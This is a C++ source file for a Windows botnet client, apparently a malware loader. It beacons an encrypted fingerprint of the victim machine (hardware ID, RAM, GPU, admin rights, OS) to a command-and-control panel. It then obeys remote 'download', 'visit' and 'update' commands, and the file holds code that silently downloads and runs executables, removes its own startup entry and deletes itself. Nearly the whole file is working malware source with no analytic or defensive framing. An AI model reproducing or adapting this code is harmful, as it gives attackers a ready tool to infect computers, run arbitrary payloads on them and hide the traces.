#include "http.h"
#include <sstream>
#include <stdio.h>
#include <windows.h> 
#include <wininet.h> 
#include <tchar.h>
#include <urlmon.h>
#include <stdlib.h> 
#include <stdio.h>
#include <intrin.h>
#include <vector>

#include "startup.h"

const char* Domain = "";
const char* Alive = "/portal/gateway/alive/index.php";
const char* Command = "/portal/gateway/command/index.php";
unsigned char * key = (unsigned char *)"8417a031bdadfb493a827cfec74bba14";
TCHAR hdrs[] = _T("Content-Type: application/x-www-form-urlencoded");

int BlockIsEmpty(char *buf, size_t size)
{
	static const char zero[999] = { 0 };
	return !memcmp(zero, buf, size > 999 ? 999 : size);
}

bool HttpPost(string data)
{
	HINTERNET hSession = InternetOpenA("icel", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hSession, Domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", Command, NULL, NULL, NULL, 0, 1);

	bool RetVal = HttpSendRequestA(hRequest, hdrs, strlen(hdrs), (char*)data.c_str(), data.length());

	InternetCloseHandle(hSession);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);
	return RetVal;
}

void PostRoutine()
{

	stringstream PostStream;	
	PostStream << "&proc=" << Hex(rencFOUR((byte*)getProc().c_str(), key))
		<< "&bot_id=" << Hex(rencFOUR((byte*)getHwid().c_str(), key))
		<< "&space=" << Hex(rencFOUR((byte*)to_string(getDisk()).c_str(), key))
		<< "&ram=" << Hex(rencFOUR((byte*)to_string(getRam()).c_str(), key))
		<< "&arch=" << Hex(rencFOUR((byte*)getSys().c_str(), key))
		<< "&isAdmin=" << Hex(rencFOUR((byte*)to_string(IsUserAnAdmin()).c_str(), key))
		<< "&os=" << Hex(rencFOUR((byte*)getWinVer().c_str(), key))
		<< "&gpu=" << Hex(rencFOUR((byte*)getGPU().c_str() , key))
		<< "&version=" << Hex(rencFOUR((byte*)"1.0", key))
		<< "\0";

	HINTERNET hSession = InternetOpenA("icel", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hSession, Domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", Alive, NULL, NULL, NULL, 0, 1);

	if (HttpSendRequestA(hRequest, hdrs, strlen(hdrs), (char*)PostStream.str().c_str(), PostStream.str().length()))
	{
		vector<string> CommandList;
		string RawCommand;
		CHAR Buffer[2048];		
		DWORD dwRead = 0;

		ZeroMemory(&Buffer, sizeof(Buffer));
		while (InternetReadFile(hRequest, Buffer, sizeof(Buffer), &dwRead) && dwRead)
		{
			Buffer[dwRead] = 0;
			dwRead = 0;
		}

		if (!BlockIsEmpty(Buffer, sizeof(Buffer)))
		{
			RawCommand = rencFOUR((byte*)Str(Buffer, true).c_str(), key);
			char* pch = strtok((char*)RawCommand.c_str(), " ");
			while (pch != NULL) {
				CommandList.push_back(pch);
				pch = strtok(NULL, " ");
			}

			if (CommandList[0] == "download")
			{
				string Status;
				stringstream Post;
				Status = dl((char*)CommandList[1].c_str());

				stringstream postdata;
				postdata << "&bot_id=" << Hex(rencFOUR((byte*)getHwid().c_str(), key))
					<< "&cmd_id=" << Hex(rencFOUR((byte*)CommandList[2].c_str(), key))
					<< "&cmd_status=" << Hex(rencFOUR((byte*)Status.c_str(), key));

				HttpPost(postdata.str());
			}
			else if (CommandList[0] == "visit")
			{
				stringstream Post;
				Visit((char*)CommandList[1].c_str());

				stringstream postdata;
				postdata << "&bot_id=" << Hex(rencFOUR((byte*)getHwid().c_str(), key))
					<< "&cmd_id=" << Hex(rencFOUR((byte*)CommandList[2].c_str(), key))
					<< "&cmd_status=" << Hex(rencFOUR((byte*)"ok", key));

				HttpPost(postdata.str());
			}
			else if (CommandList[0] == "update")
			{
				stringstream postdata;
				postdata << "&bot_id=" << Hex(rencFOUR((byte*)getHwid().c_str(), key))
					<< "&cmd_id=" << Hex(rencFOUR((byte*)CommandList[2].c_str(), key))
					<< "&cmd_status=" << Hex(rencFOUR((byte*)"ok", key));

				HttpPost(postdata.str());
				Update((char*)CommandList[1].c_str());
			}
		}
		else {
			return;
		}
		InternetCloseHandle(hSession);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hRequest);
	}
	else {
		return;
	}
}

void Visit(char* sUrl)
{
	ShellExecuteA(0, 0, sUrl, 0, 0, SW_SHOW);
	return;
}

void SelfDestruct()
{
	SHELLEXECUTEINFO sei;

	TCHAR szModule[MAX_PATH],
		szComspec[MAX_PATH],
		szParams[MAX_PATH];

	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) &&
		(GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		lstrcpy(szParams, "/c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");

		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = "Open";
		sei.lpFile = szComspec;
		sei.lpParameters = szParams;
		sei.lpDirectory = 0;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		if (ShellExecuteEx(&sei))
		{
			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS); //removing process stops
			SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //accelerate our process
			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); //accelerate our thread
			SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
			return;
		}
	}
}

void Update(char* sUrl) {
	dl(sUrl);
	removeAppFromStartUp();
	SelfDestruct();
	exit(0);
}
char* dl(char* sUrl)
{
	HRESULT hr;
	TCHAR *fileName;

	fileName = "temp";
	strcat(fileName, ".exe");

	LPCTSTR Url = _T(sUrl), File = _T(fileName);
	hr = URLDownloadToFile (0, Url, File, 0, 0);
	switch (hr)
	{
	    case S_OK: ShellExecute(0, _T("open"), fileName, NULL, NULL, SW_HIDE);
			return "ok";
			break;
		case E_OUTOFMEMORY: return "fail";
			break;
		case INET_E_DOWNLOAD_FAILURE: return "fail";
			break;
		default: return "fail";
	}
}